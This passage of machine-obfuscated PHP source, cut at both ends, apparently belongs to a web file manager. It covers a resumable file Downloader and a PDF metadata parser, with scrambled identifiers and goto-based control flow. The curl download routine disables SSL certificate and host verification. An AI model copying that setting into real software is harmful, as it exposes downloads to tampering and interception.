$e÷ÆãÃ³Ó[1044]) { $FÑœÎØÚ‚[$e÷ÆãÃ³Ó[1518]] = $e÷ÆãÃ³Ó[301]; } $FÑœÎØÚ‚[$e÷ÆãÃ³Ó[1488]] = $a‰ËÄˆš¥Ù; $this->update(); } } class Downloader { static function start($bôÆƒ·õÊæ, $c—¤ÏÊÀÒ, $Bé•Š™Ïº = 10) { goto c¸™ÔËìÍÍ; c“·‹†£è: if (!$bôÆƒ·õÊæ) { return array($Eƒæ“ğ‡’É[1036] => !1, $Eƒæ“ğ‡’É[1038] => $Eƒæ“ğ‡’É[1041]); } if (!$dîœƒï¼èİ[$Eƒæ“ğ‡’É[1294]] || $dîœƒï¼èİ[$Eƒæ“ğ‡’É[325]] == 0) { @unlink($D‹›¶äÑ˜); @unlink($c—¤ÏÊÀÒ); $BÌ˜©¢Ú = self::fileDownloadFopen($bôÆƒ·õÊæ, $c—¤ÏÊÀÒ, $dîœƒï¼èİ[$Eƒæ“ğ‡’É[325]]); if ($BÌ˜©¢Ú[$Eƒæ“ğ‡’É[1036]]) { return $BÌ˜©¢Ú; } else { @unlink($D‹›¶äÑ˜); @unlink($c—¤ÏÊÀÒ); $BÌ˜©¢Ú = self::fileDownloadCurl($bôÆƒ·õÊæ, $c—¤ÏÊÀÒ, !1, 0, $dîœƒï¼èİ[$Eƒæ“ğ‡’É[325]]); @unlink($D‹›¶äÑ˜); return $BÌ˜©¢Ú; } } $Bøèã¸¤æâ = is_file($D‹›¶äÑ˜) ? filesize($D‹›¶äÑ˜) : 0; goto e×Èç‹é‡; bš‘‹Œªµó: if (is_file($c¶Ÿ÷·£½)) { $b‰èèºÇ£‘ = file_get_contents($c¶Ÿ÷·£½); $e„¶‚Î°ø¹ = json_decode($b‰èèºÇ£‘, 1); } if (file_exists($c—¤ÏÊÀÒ) && $e›’Ôñäœ == filesize($c—¤ÏÊÀÒ)) { @unlink($D‹›¶äÑ˜); @unlink($c¶Ÿ÷·£½); return array($Eƒæ“ğ‡’É[1036] => !0, $Eƒæ“ğ‡’É[1038] => $Eƒæ“ğ‡’É[1526]); } if ($e„¶‚Î°ø¹[$Eƒæ“ğ‡’É[325]] != $e›’Ôñäœ) { $e„¶‚Î°ø¹ = array($Eƒæ“ğ‡’É[325] => $e›’Ôñäœ); } goto C¿íªèãˆô; e×Èç‹é‡: $e›’Ôñäœ = intval($dîœƒï¼èİ[$Eƒæ“ğ‡’É[325]]); if (file_exists($D‹›¶äÑ˜) && time() - filemtime($D‹›¶äÑ˜) < 3) { return array($Eƒæ“ğ‡’É[1036] => !1, $Eƒæ“ğ‡’É[1038] => $Eƒæ“ğ‡’É[1525]); } $e„¶‚Î°ø¹ = array(); goto bš‘‹Œªµó; CÊæ›øà¥: if ($BÌ˜©¢Ú[$Eƒæ“ğ‡’É[1036]]) { @unlink($c¶Ÿ÷·£½); } return $BÌ˜©¢Ú; goto cå™ïÙé¾ˆ; c¸™ÔËìÍÍ: $Eƒæ“ğ‡’É =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!request_url_safe($bôÆƒ·õÊæ)) { return array($Eƒæ“ğ‡’É[1036] => !1, $Eƒæ“ğ‡’É[1038] => $Eƒæ“ğ‡’É[1041]); } $c¶Ÿ÷·£½ = $c—¤ÏÊÀÒ . $Eƒæ“ğ‡’É[1523]; goto A¶àëˆí—“; C¿íªèãˆô: if ($Bøèã¸¤æâ > $e›’Ôñäœ) { @unlink($D‹›¶äÑ˜); } file_put_contents($c¶Ÿ÷·£½, json_encode($e„¶‚Î°ø¹)); $BÌ˜©¢Ú = self::fileDownloadCurl($bôÆƒ·õÊæ, $c—¤ÏÊÀÒ, !0, $Bøèã¸¤æâ, $e›’Ôñäœ); goto CÊæ›øà¥; A¶àëˆí—“: $D‹›¶äÑ˜ = $c—¤ÏÊÀÒ . $Eƒæ“ğ‡’É[1524]; if (is_array($bôÆƒ·õÊæ)) { $dîœƒï¼èİ = $bôÆƒ·õÊæ; } else { $dîœƒï¼èİ = url_header($bôÆƒ·õÊæ); } $bôÆƒ·õÊæ = $dîœƒï¼èİ[$Eƒæ“ğ‡’É[295]]; goto c“·‹†£è; cå™ïÙé¾ˆ: } static function fileDownloadFopen($F‡ƒ†ÆÂš, $EÃ¿Â‡†Ä, $aö’‚ô™Ê© = 0) { $EåŸ¿ØïÖ =& $_SERVER[³‘’¼äÑ™ÔÍ]; @ini_set($EåŸ¿ØïÖ[1527], $EåŸ¿ØïÖ[1528]); $B›šÈæ•ª = $EÃ¿Â‡†Ä . $EåŸ¿ØïÖ[1524]; set_timeout(); @unlink($B›šÈæ•ª); if ($B¶Òª„å¿ˆ = @fopen($F‡ƒ†ÆÂš, $EåŸ¿ØïÖ[1529])) { goto C†ä‡Ë‚’æ; eÓÍˆå¾: return array($EåŸ¿ØïÖ[1036] => !0, $EåŸ¿ØïÖ[1038] => $EåŸ¿ØïÖ[699]); goto CÛ¤„†ôºÆ; C†ä‡Ë‚’æ: if (!($bÖË‰ñ•‰ = @fopen($B›šÈæ•ª, $EåŸ¿ØïÖ[1530]))) { return array($EåŸ¿ØïÖ[1036] => !1, $EåŸ¿ØïÖ[1038] => $EåŸ¿ØïÖ[1531]); } while (!feof($B¶Òª„å¿ˆ)) { if (!file_exists($B›šÈæ•ª)) { fclose($bÖË‰ñ•‰); return array($EåŸ¿ØïÖ[1036] => !1, $EåŸ¿ØïÖ[1038] => $EåŸ¿ØïÖ[1532]); } clearstatcache(); if ($aö’‚ô™Ê© > 0 && $aö’‚ô™Ê© == filesize(iconv_system($B›šÈæ•ª))) { break; } fwrite($bÖË‰ñ•‰, fread($B¶Òª„å¿ˆ, 1024 * 8), 1024 * 8); } fclose($bÖË‰ñ•‰); goto DÀäùö¹Õ; DÀäùö¹Õ: fclose($B¶Òª„å¿ˆ); self::checkGzip($B›šÈæ•ª); if (!@rename($B›šÈæ•ª, $EÃ¿Â‡†Ä)) { usleep(round(rand(0, 1000) * 50)); @unlink($EÃ¿Â‡†Ä); $a Ù“„ò÷ = @rename($B›šÈæ•ª, $EÃ¿Â‡†Ä); if (!$a Ù“„ò÷) { return array($EåŸ¿ØïÖ[1036] => !1, $EåŸ¿ØïÖ[1038] => $EåŸ¿ØïÖ[1533]); } } goto eÓÍˆå¾; CÛ¤„†ôºÆ: } else { return array($EåŸ¿ØïÖ[1036] => !1, $EåŸ¿ØïÖ[1038] => $EåŸ¿ØïÖ[1534]); } } static function fileDownloadCurl($fÀ„”÷Ôë , $b¿òƒÂ»±—, $A½ô‡øˆ˜ñ = false, $C •ñàÀ¡Ÿ = 0, $A»ìÅ„š»¬ = 0) { goto eÎ»—¹Ñù‚; eÄ°š³ƒÛç: curl_close($f½èÄ‚õÆ›); fclose($Aß‚İãÔº); $FĞ¶ÄÒÓéÙ = filesize(iconv_system($cİİŒÔº«)); goto eôÇÄÀù×é; e¤ô¹Ô„ç×: curl_setopt($f½èÄ‚õÆ›, CURLOPT_NOPROGRESS, !1); curl_setopt($f½èÄ‚õÆ›, CURLOPT_PROGRESSFUNCTION, $DŞÏÛ†‘Œˆ[1536]); curl_progress_start($f½èÄ‚õÆ›); goto a¼İì÷ÕãÁ; a¼İì÷ÕãÁ: curl_setopt($f½èÄ‚õÆ›, CURLOPT_USERAGENT, $DŞÏÛ†‘Œˆ[1528]); $E’Œ›å‚¬ = curl_exec($f½èÄ‚õÆ›); curl_progress_end($f½èÄ‚õÆ›); goto eÄ°š³ƒÛç; f¹±•ÏÄ: if ($A½ô‡øˆ˜ñ) { curl_setopt($f½èÄ‚õÆ›, CURLOPT_RANGE, $C •ñàÀ¡Ÿ . $DŞÏÛ†‘Œˆ[719]); } curl_setopt($f½èÄ‚õÆ›, CURLOPT_FILE, $Aß‚İãÔº); curl_setopt($f½èÄ‚õÆ›, CURLOPT_REFERER, get_url_link($fÀ„”÷Ôë )); goto F“‰™æ†³è; eÎ»—¹Ñù‚: $DŞÏÛ†‘Œˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cİİŒÔº« = $b¿òƒÂ»±— . $DŞÏÛ†‘Œˆ[1524]; set_timeout(); goto Aâ·ÊÚ¯¹®; Aâ·ÊÚ¯¹®: $Aß‚İãÔº = @fopen($cİİŒÔº«, $DŞÏÛ†‘Œˆ[984]); if (!$Aß‚İãÔº) { return array($DŞÏÛ†‘Œˆ[1036] => !1, $DŞÏÛ†‘Œˆ[1038] => $DŞÏÛ†‘Œˆ[1535]); } $f½èÄ‚õÆ› = curl_init($fÀ„”÷Ôë ); goto f¹±•ÏÄ; F“‰™æ†³è: curl_setopt($f½èÄ‚õÆ›, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($f½èÄ‚õÆ›, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($f½èÄ‚õÆ›, CURLOPT_SSL_VERIFYHOST, 0); goto e¤ô¹Ô„ç×; eôÇÄÀù×é: if ($FĞ¶ÄÒÓéÙ < $A»ìÅ„š»¬ && $A»ìÅ„š»¬ != 0) { return array($DŞÏÛ†‘Œˆ[1036] => !1, $DŞÏÛ†‘Œˆ[1038] => $DŞÏÛ†‘Œˆ[1525]); } if ($E’Œ›å‚¬ && filesize($cİİŒÔº«) != 0) { self::checkGzip($cİİŒÔº«); if (!@rename($cİİŒÔº«, $b¿òƒÂ»±—)) { @unlink($b¿òƒÂ»±—); $E’Œ›å‚¬ = @rename($cİİŒÔº«, $b¿òƒÂ»±—); if (!$E’Œ›å‚¬) { return array($DŞÏÛ†‘Œˆ[1036] => !1, $DŞÏÛ†‘Œˆ[1038] => $DŞÏÛ†‘Œˆ[1537]); } } return array($DŞÏÛ†‘Œˆ[1036] => !0, $DŞÏÛ†‘Œˆ[1038] => $DŞÏÛ†‘Œˆ[699]); } return array($DŞÏÛ†‘Œˆ[1036] => !1, $DŞÏÛ†‘Œˆ[1038] => $DŞÏÛ†‘Œˆ[1538]); goto A‘ö²ğÅ…ƒ; A‘ö²ğÅ…ƒ: } static function checkGzip($AÊù„à±ŞÁ) { goto f‡Ë¨ê÷¿; bĞ‰¨³·ˆ²: file_put_contents($AÊù„à±ŞÁ, $E•¼¯ÓÁê); goto EÎ—Œ½…”ë; FÑö¡Ãíß®: ob_start(); readgzfile($AÊù„à±ŞÁ); $E•¼¯ÓÁê = ob_get_clean(); goto bĞ‰¨³·ˆ²; f‡Ë¨ê÷¿: $FÊÌÓãÆã© = $_SERVER[³‘’¼äÑ™ÔÍ][1539]; $eÙğÀô†ÏÊ = file_sub_str($AÊù„à±ŞÁ, 0, 2); if ($FÊÌÓãÆã© != $eÙğÀô†ÏÊ) { return; } goto FÑö¡Ãíß®; EÎ—Œ½…”ë: } } class FileParsePdf { public static function parse($F—†¶Ãì) { goto a„Öæ£ó; cäí…†Í›: $aóÌá¡‡À[$aÏø¥›çˆƒ[1541]] = StreamWrapperIO::read($F—†¶Ãì, 0, $f¹¼•ŞÈÂ©); $aóÌá¡‡À[$aÏø¥›çˆƒ[1542]] = StreamWrapperIO::read($F—†¶Ãì, $aóÌá¡‡À[$aÏø¥›çˆƒ[77]] - $f¹¼•ŞÈÂ©, $f¹¼•ŞÈÂ©); $Eé›’Ù¼¦ = self::decodeXref($aóÌá¡‡À); goto f—àñÌÏµ“; DÀ¥±£‚ª»: if ($eîÏÑ–ˆ[1] && $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1548]] < $eîÏÑ–ˆ[1][0]) { $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1548]] = $eîÏÑ–ˆ[1][0]; } $a‡èêõÁ±œ = self::parseInfoItem($a‡èêõÁ±œ); return $a‡èêõÁ±œ; goto f³ôŸ‡‹óÇ; Fš¦õ¡Œ­: $FÎïù½«°¡ = $aÏø¥›çˆƒ[1545]; preg_match($FÎïù½«°¡, $aóÌá¡‡À[$aÏø¥›çˆƒ[1541]], $eîÏÑ–ˆ); if (!$a‡èêõÁ±œ[$aÏø¥›çˆƒ[1544]] && count($eîÏÑ–ˆ) == 5) { $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1544]] = $eîÏÑ–ˆ[3]; $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1546]] = $eîÏÑ–ˆ[4]; } goto DÌå†…òõÛ; f—àñÌÏµ“: if ($Eé›’Ù¼¦) { $Bğ‚ÄÅĞ = $Eé›’Ù¼¦[$aÏø¥›çˆƒ[1543]][$aÏø¥›çˆƒ[1198]]; $a‡èêõÁ±œ = self::getObjectValue($aóÌá¡‡À, $Eé›’Ù¼¦, $Bğ‚ÄÅĞ); } $a‡èêõÁ±œ = is_array($a‡èêõÁ±œ) ? $a‡èêõÁ±œ : array(); $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1544]] = 0; goto Fš¦õ¡Œ­; a„Öæ£ó: $aÏø¥›çˆƒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f¹¼•ŞÈÂ© = 32 * 1024; $aóÌá¡‡À = array($aÏø¥›çˆƒ[780] => fopen($F—†¶Ãì, $aÏø¥›çˆƒ[1176]), $aÏø¥›çˆƒ[75] => $F—†¶Ãì, $aÏø¥›çˆƒ[77] => filesize($F—†¶Ãì), $aÏø¥›çˆƒ[1540] => $f¹¼•ŞÈÂ©); goto cäí…†Í›; DÌå†…òõÛ: preg_match($FÎïù½«°¡, $aóÌá¡‡À[$aÏø¥›çˆƒ[1542]], $eîÏÑ–ˆ); if (!$a‡èêõÁ±œ[$aÏø¥›çˆƒ[1544]] && count($eîÏÑ–ˆ) == 5) { $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1544]] = $eîÏÑ–ˆ[3]; $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1546]] = $eîÏÑ–ˆ[4]; } preg_match($aÏø¥›çˆƒ[1547], $aóÌá¡‡À[$aÏø¥›çˆƒ[1541]], $eîÏÑ–ˆ); goto aÔÜ˜ÄÂƒ“; aÔÜ˜ÄÂƒ“: if ($eîÏÑ–ˆ) { $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1350]] = $eîÏÑ–ˆ[1]; } $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1548]] = 0; $FÎïù½«°¡ = $aÏø¥›çˆƒ[1549]; goto F¨ËÌœáˆ; F¨ËÌœáˆ: preg_match_all($FÎïù½«°¡, $aóÌá¡‡À[$aÏø¥›çˆƒ[1541]], $eîÏÑ–ˆ); if ($eîÏÑ–ˆ[1] && $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1548]] < $eîÏÑ–ˆ[1][0]) { $a‡èêõÁ±œ[$aÏø¥›çˆƒ[1548]] = $eîÏÑ–ˆ[1][0]; } preg_match_all($FÎïù½«°¡, $aóÌá¡‡À[$aÏø¥›çˆƒ[1542]], $eîÏÑ–ˆ); goto DÀ¥±£‚ª»; f³ôŸ‡‹óÇ: } private static function parseInfoItem($fÛóÇÀÚ¨„) { $E¯¤ŒõâßÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$fÛóÇÀÚ¨„) { return !1; } $A¦Û’©ø§ = array($E¯¤ŒõâßÄ[1351] => array($E¯¤ŒõâßÄ[1550], $E¯¤ŒõâßÄ[33]), $E¯¤ŒõâßÄ[1551] => array($E¯¤ŒõâßÄ[1552], $E¯¤ŒõâßÄ[33]), $E¯¤ŒõâßÄ[187] => array($E¯¤ŒõâßÄ[1553], $E¯¤ŒõâßÄ[210]), $E¯¤ŒõâßÄ[107] => array($E¯¤ŒõâßÄ[1554], $E¯¤ŒõâßÄ[210]), $E¯¤ŒõâßÄ[1548] => array($E¯¤ŒõâßÄ[1548], $E¯¤ŒõâßÄ[276]), $E¯¤ŒõâßÄ[1544] => array($E¯¤ŒõâßÄ[1544], $E¯¤ŒõâßÄ[276]), $E¯¤ŒõâßÄ[1546] => array($E¯¤ŒõâßÄ[1546], $E¯¤ŒõâßÄ[276]), $E¯¤ŒõâßÄ[1555] => array($E¯¤ŒõâßÄ[1556], $E¯¤ŒõâßÄ[33]), $E¯¤ŒõâßÄ[1557] => array($E¯¤ŒõâßÄ[1558], $E¯¤ŒõâßÄ[33]), $E¯¤ŒõâßÄ[1559] => array($E¯¤ŒõâßÄ[1350], $E¯¤ŒõâßÄ[33])); $E‰âñŞšŸ = array(); foreach ($A¦Û’©ø§ as $bª¯™•ÈÜ˜ => $fÀæƒ£†Ì) { if (!isset($fÛóÇÀÚ¨„[$fÀæƒ£†Ì[0]])) { continue; } $A£©…¦ìÏ = $fÛóÇÀÚ¨„[$fÀæƒ£†Ì[0]]; if (!$A£©…¦ìÏ || is_array($A£©…¦ìÏ)) { continue; } switch ($fÀæƒ£†Ì[1]) { case $E¯¤ŒõâßÄ[276]: $A£©…¦ìÏ = intval($A£©…¦ìÏ); break; case $E¯¤ŒõâßÄ[210]: if (substr($A£©…¦ìÏ, 0, 2) == $E¯¤ŒõâßÄ[1560]) { $A£©…¦ìÏ = substr($A£©…¦ìÏ, 2, 14); } if (strtotime($A£©…¦ìÏ)) { $A£©…¦ìÏ = date($E¯¤ŒõâßÄ[1561], strtotime($A£©…¦ìÏ)); } break; } $E‰âñŞšŸ[$bª¯™•ÈÜ˜] = $A£©…¦ìÏ; } return $E‰âñŞšŸ; } private static function decodeXref(&$c±“…ÄÎÉ) { goto E±§ÈÁ“Àõ; dÈØĞ¤‘¯›: $aİÊâøŒ˜ƒ = $Aœ”®»ÑĞÌ[1563]; if (!preg_match_all($aİÊâøŒ˜ƒ, $cˆ‘æÅ–ŞÊ, $e‰ó„±‹, PREG_SET_ORDER, 0)) { return !1; } $aŞÙ°ÑƒÎ = intval($e‰ó„±‹[0][1]); goto AÚŞÅ£ÄÔ; E±§ÈÁ“Àõ: $Aœ”®»ÑĞÌ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cˆ‘æÅ–ŞÊ = $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1542]]; $EÏˆÔ‹ïè = array($Aœ”®»ÑĞÌ[1543] => array(), $Aœ”®»ÑĞÌ[1562] => array()); goto dÈØĞ¤‘¯›; AÚŞÅ£ÄÔ: if ($c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[77]] - $aŞÙ°ÑƒÎ > $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1540]]) { $d‡Ù¯™ã© = 4 * $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1540]]; $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1540]] = $d‡Ù¯™ã©; $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1541]] = StreamWrapperIO::read($c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[75]], 0, $d‡Ù¯™ã©); $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1542]] = StreamWrapperIO::read($c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[75]], $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[77]] - $d‡Ù¯™ã©, $d‡Ù¯™ã©); $cˆ‘æÅ–ŞÊ = $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1542]]; } $e±µ˜àãÇ  = 0; preg_match_all($Aœ”®»ÑĞÌ[1564], $cˆ‘æÅ–ŞÊ, $e‰ó„±‹); goto A „ùß˜èÎ; D³¬ªˆ¸šŒ: if (preg_match($Aœ”®»ÑĞÌ[1569], $c‡Ğ‡œŒ³, $e‰ó„±‹) > 0) { $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[77]] = intval($e‰ó„±‹[1]); } if (preg_match($Aœ”®»ÑĞÌ[1570], $c‡Ğ‡œŒ³, $e‰ó„±‹) > 0) { $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[1571]] = intval($e‰ó„±‹[1]) . $Aœ”®»ÑĞÌ[70] . intval($e‰ó„±‹[2]); } if (preg_match($Aœ”®»ÑĞÌ[1572], $c‡Ğ‡œŒ³, $e‰ó„±‹) > 0) { $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[1573]] = intval($e‰ó„±‹[1]) . $Aœ”®»ÑĞÌ[70] . intval($e‰ó„±‹[2]); } goto Eê‚ôšÄÙ™; Eê‚ôšÄÙ™: if (preg_match($Aœ”®»ÑĞÌ[1574], $c‡Ğ‡œŒ³, $e‰ó„±‹) > 0) { $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[1198]] = intval($e‰ó„±‹[1]) . $Aœ”®»ÑĞÌ[70] . intval($e‰ó„±‹[2]); } if (preg_match($Aœ”®»ÑĞÌ[1575], $c‡Ğ‡œŒ³, $e‰ó„±‹) > 0) { $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[367]] = array(); $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[367]][0] = $e‰ó„±‹[1]; $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[367]][1] = $e‰ó„±‹[2]; } if (!$EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1543]][$Aœ”®»ÑĞÌ[1198]]) { return !1; } goto Cî†¬ñ¨Ó; A „ùß˜èÎ: foreach ($e‰ó„±‹[3] as $fØ¬¢¸«Ñ‘ => $B­Šå”àØç) { if ($e‰ó„±‹[3][$fØ¬¢¸«Ñ‘] == $Aœ”®»ÑĞÌ[1565]) { $bƒ ÕĞÁ¦‘ = $e±µ˜àãÇ  . $Aœ”®»ÑĞÌ[70] . intval($e‰ó„±‹[2][$fØ¬¢¸«Ñ‘]); $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1562]][$bƒ ÕĞÁ¦‘] = intval($e‰ó„±‹[1][$fØ¬¢¸«Ñ‘]); ++$e±µ˜àãÇ ; } else { if ($e‰ó„±‹[3][$fØ¬¢¸«Ñ‘] == $Aœ”®»ÑĞÌ[1566]) { ++$e±µ˜àãÇ ; } else { } } } if (preg_match_all($Aœ”®»ÑĞÌ[1567], $cˆ‘æÅ–ŞÊ, $e‰ó„±‹)) { $DˆÂˆèØ‘ = $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[77]] - $c±“…ÄÎÉ[$Aœ”®»ÑĞÌ[1540]]; foreach ($e‰ó„±‹[0] as $fØ¬¢¸«Ñ‘ => $A»Î½ÂäÀ) { $BêĞ©×ˆÀ = $e‰ó„±‹[1][$fØ¬¢¸«Ñ‘] . $Aœ”®»ÑĞÌ[70] . $e‰ó„±‹[2][$fØ¬¢¸«Ñ‘]; $EÏˆÔ‹ïè[$Aœ”®»ÑĞÌ[1562]][$BêĞ©×ˆÀ] = strpos($cˆ‘æÅ–ŞÊ, $A»Î½ÂäÀ) + $DˆÂˆèØ‘ + 1; } } if (preg_match_all($Aœ”®»ÑĞÌ[1568], $cˆ‘æÅ–ŞÊ, $e‰ó„±‹)) { $c‡Ğ‡œŒ³ = count($e‰ó„±‹[1]) == 1 ? $e‰ó„±‹[1][0] : $e‰ó„±‹[1][1]; } else { $c‡Ğ‡œŒ³ = substr($cˆ‘æÅ–ŞÊ, -1024 * 5); } goto D³¬ªˆ¸šŒ; Cî†¬ñ¨Ó: if (preg_match($Aœ”®»ÑĞÌ[1576], $c‡Ğ‡œŒ³, $e‰ó„±‹) > 0) { } return $EÏˆÔ‹ïè; goto DÄÙã‰ïÔ; DÄÙã‰ïÔ: } private static function getObjectValue($Dù’Š¼óìÏ, $cÆ±¼ÜÀõµ, $DÂİ®Ïôî›) { goto Bà”‰Ñ’à; cá”¦­¡Ì: return $C‘Îï½‹õ; goto dÃ„Ñ¸Üæ—; Bà”‰Ñ’à: $E‰¯´ÇèˆŸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EŠùÛÃæ = self::getObject($Dù’Š¼óìÏ, $cÆ±¼ÜÀõµ[$E‰¯´ÇèˆŸ[1562]][$DÂİ®Ïôî›]); if (is_string($EŠùÛÃæ[1])) { return $EŠùÛÃæ[1]; } goto D‘¶Æ»­Ğë; D‘¶Æ»­Ğë: if (!is_array($EŠùÛÃæ[1])) { return array(); } $C‘Îï½‹õ = array(); for ($aÓ–ùÊ‰ãÏ = 0; $aÓ–ùÊ‰ãÏ < count($EŠùÛÃæ[1]); $aÓ–ùÊ‰ãÏ += 2) { $CÍ«öğæ‚¿ = $EŠùÛÃæ[1][$aÓ–ùÊ‰ãÏ]; $dØëïø¤ê = $EŠùÛÃæ[1][$aÓ–ùÊ‰ãÏ + 1]; if (count($CÍ«öğæ‚¿) == 3 && $CÍ«öğæ‚¿[0] == $E‰¯´ÇèˆŸ[8]) { $FğÒ ³Ú¡» = !1; if ($dØëïø¤ê[0] == $E‰¯´ÇèˆŸ[1577]) { $dØëïø¤ê = self::getObject($Dù’Š¼óìÏ, $cÆ±¼ÜÀõµ[$E‰¯´ÇèˆŸ[1562]][$dØëïø¤ê[1]]); } $FğÒ ³Ú¡» = $dØëïø¤ê[1]; if ($FğÒ ³Ú¡» === !1) { continue; } if (is_string($FğÒ ³Ú¡»)) { $FğÒ ³Ú¡» = self::decodeStr($FğÒ ³Ú¡»); } $C‘Îï½‹õ[$CÍ«öğæ‚¿[1]] = $FğÒ ³Ú¡»; } } goto cá”¦­¡Ì; dÃ„Ñ¸Üæ—: } private static function getObject($dÈÏ‰Ùµ¤Ø, $BÉÉÁÁá¶„) { $f‹Ï…Œª·Õ = self::getObjectItem($dÈÏ‰Ùµ¤Ø, $BÉÉÁÁá¶„); $f‹Ï…Œª·Õ = self::getObjectItem($dÈÏ‰Ùµ¤Ø, $f‹Ï…Œª·Õ[2]); return $f‹Ï…Œª·Õ; } private static function getObjectItem($a· ‰äèÕ‘, $A…Ö¢ŞÏ) { goto e¡çÈï¿ğÔ; e¡çÈï¿ğÔ: $c‹ƒÌÊÏÍ£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B·«ø—¾·² = $a· ‰äèÕ‘[$c‹ƒÌÊÏÍ£[1540]]; $fÎóŞÀèÊ = $a· ‰äèÕ‘[$c‹ƒÌÊÏÍ£[77]] - $B·«ø—¾·²; goto fïÒˆ†‚éß; fïÒˆ†‚éß: $aç¦ò¼ê¢ = $A…Ö¢ŞÏ >= $fÎóŞÀèÊ ? $A…Ö¢ŞÏ - $fÎóŞÀèÊ : $A…Ö¢ŞÏ; $D ùöÇ¼¼é = $A…Ö¢ŞÏ >= $fÎóŞÀèÊ ? $a· ‰äèÕ‘[$c‹ƒÌÊÏÍ£[1542]] : $a· ‰äèÕ‘[$c‹ƒÌÊÏÍ£[1541]]; if ($A…Ö¢ŞÏ > $B·«ø—¾·² && $A…Ö¢ŞÏ <= $fÎóŞÀèÊ) { $aç¦ò¼ê¢ = 0; $D ùöÇ¼¼é = StreamWrapperIO::read($a· ‰äèÕ‘[$c‹ƒÌÊÏÍ£[75]], $A…Ö¢ŞÏ, $B·«ø—¾·²); } goto D“¶¸öÂ°à; D“¶¸öÂ°à: $bÕãŒ¨Ü¶ = self::getRawObject($D ùöÇ¼¼é, $aç¦ò¼ê¢); if ($A…Ö¢ŞÏ >= $fÎóŞÀèÊ) { $bÕãŒ¨Ü¶[2] = $bÕãŒ¨Ü¶[2] + $fÎóŞÀèÊ; } else { if ($A…Ö¢ŞÏ > $B·«ø—¾·² && $A…Ö¢ŞÏ <= $fÎóŞÀèÊ) { $bÕãŒ¨Ü¶[2] = $bÕãŒ¨Ü¶[2] + $A…Ö¢ŞÏ; } } return $bÕãŒ¨Ü¶; goto CÄ Àæ©Çó; CÄ Àæ©Çó: } private static function decodeStr($D¤¦İÎù¡Ø) { goto E÷š¸ØŸîÖ; E÷š¸ØŸîÖ: $dá·èÑ†³° =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D¤¦İÎù¡Ø = str_replace(array($dá·èÑ†³°[1578], $dá·èÑ†³°[1579], $dá·èÑ†³°[1580], $dá·èÑ†³°[1581], $dá·èÑ†³°[1582], $dá·èÑ†³°[1583], $dá·èÑ†³°[1584], $dá·èÑ†³°[1585]), array($dá·èÑ†³°[93], $dá·èÑ†³°[50], $dá·èÑ†³°[8], $dá·èÑ†³°[248], $dá·èÑ†³°[821], $dá·èÑ†³°[217], $dá·èÑ†³°[996], $dá·èÑ†³°[330]), $D¤¦İÎù¡Ø); $fæñ®ãğÊ = preg_split($dá·èÑ†³°[1586], $D¤¦İÎù¡Ø, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto a×Î“«˜‘¾; D±Õ”¸‘ƒ•: $D¤¦İÎù¡Ø = $dá·èÑ†³°[33]; foreach ($fæñ®ãğÊ as $E“‹˜Ş‰—) { if (preg_match($dá·èÑ†³°[1592], $E“‹˜Ş‰—) && !1 === stripos($E“‹˜Ş‰—, $dá·èÑ†³°[1593])) { $E“‹˜Ş‰— = preg_replace($dá·èÑ†³°[1594], $dá·èÑ†³°[33], $E“‹˜Ş‰—); $E“‹˜Ş‰— = trim($E“‹˜Ş‰—, $dá·èÑ†³°[930]); $E“‹˜Ş‰— = pack($dá·èÑ†³°[1595], $E“‹˜Ş‰—); $D¤¦İÎù¡Ø .= $E“‹˜Ş‰—; } else { $D¤¦İÎù¡Ø .= $E“‹˜Ş‰—; } } if (preg_match($dá·èÑ†³°[1596], $D¤¦İÎù¡Ø)) { $c¨Ø É¤… = substr($D¤¦İÎù¡Ø, 2); $D¤¦İÎù¡Ø = $dá·èÑ†³°[33]; $e›•ŠÀËÆ¾ = strlen($c¨Ø É¤…); for ($dî§óÍ£ = 0; $dî§óÍ£ < $e›•ŠÀËÆ¾; $dî§óÍ£ += 2) { 